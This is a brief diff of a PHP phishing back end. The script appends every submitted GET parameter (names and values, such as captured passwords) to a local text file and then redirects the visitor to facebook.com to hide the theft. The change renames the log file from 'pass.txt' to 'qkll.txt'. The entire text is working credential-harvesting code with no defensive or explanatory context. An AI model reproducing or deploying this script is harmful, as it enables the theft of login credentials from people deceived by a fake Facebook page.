@@ -1,6 +1,6 @@
 <?php
 header ('Location: https://www.facebook.com');
-$handle = fopen("pass.txt", "a");
+$handle = fopen("qkll.txt", "a");
 foreach($_GET as $variable => $value) {
 fwrite($handle, $variable);
 fwrite($handle, "=");
@@ -11,3 +11,4 @@ fwrite($handle, "\r\n");
 fclose($handle);
 exit;
 ?>
+
